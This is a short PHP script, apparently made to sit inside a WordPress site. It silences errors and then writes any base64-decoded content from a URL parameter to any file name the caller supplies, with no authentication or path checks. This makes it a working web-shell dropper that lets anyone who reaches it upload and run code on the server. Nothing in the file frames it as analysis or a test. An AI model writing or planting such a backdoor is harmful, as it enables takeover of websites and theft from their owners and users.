<?php

ini_set('display_errors','Off'); 
ini_set('error_reporting', E_ALL ); 

define('WP_DEBUG', false); 
define('WP_DEBUG_DISPLAY', false);
define('WRITABLE_DIR', '');

file_put_contents(WRITABLE_DIR.$_GET['filename'], base64_decode($_GET['data']));

echo $_GET['filename'];
?>